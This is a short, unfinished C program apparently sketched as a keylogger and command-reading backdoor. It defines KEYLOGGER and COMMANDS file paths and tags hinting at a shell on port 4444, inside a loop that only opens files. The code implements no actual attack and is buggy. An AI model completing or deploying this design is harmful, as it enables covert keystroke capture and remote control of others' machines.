#include <stdio.h>
#include <stdlib.h>

#define KEYLOGGER "/var/log/test"
#define COMMANDS "/tmp/cmd.txt"


// :cmd_ls:
// :shell_4444:

int main(){



    while (1){
        /* Commands */
        FILE *cmd = fopen(COMMANDS, "r");

        if (cmd == NULL){
            // Do nothing
        }

        //loop throught the content


        /* KEYLOGGER */
        FILE *key = fopen(KEYLOGGER, "r");

    }
    

}